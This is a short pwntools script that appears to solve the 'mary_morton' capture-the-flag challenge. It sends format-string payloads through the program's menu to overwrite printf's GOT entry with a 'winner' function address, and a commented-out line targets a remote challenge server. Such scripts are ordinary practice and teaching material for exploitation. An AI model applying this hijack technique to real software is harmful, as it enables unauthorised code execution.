#!/usr/bin/env python

from pwn import *
from formatStringExploiter.FormatString import FormatString
from time import sleep

elf = ELF("./mary_morton")
context.binary = elf

def connect():
    global p
    p = process(elf.file.name)
    #p = remote("146.185.132.36",19153)
    p.recvuntil("Exit the battle \n")

def exec_fmt(s):
    print("Sending: " + repr(s))
    p.sendline("2")
    sleep(0.1)
    p.sendline(s)
    ret = p.recvuntil("1. Stack Bufferoverflow Bug",drop=True)
    p.recvuntil("Exit the battle \n")
    return ret

winner = 0x4008DA

connect()

fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)

fmtStr.write_q(elf.symbols['got.printf'], winner)

p.sendline("2")
p.interactive()
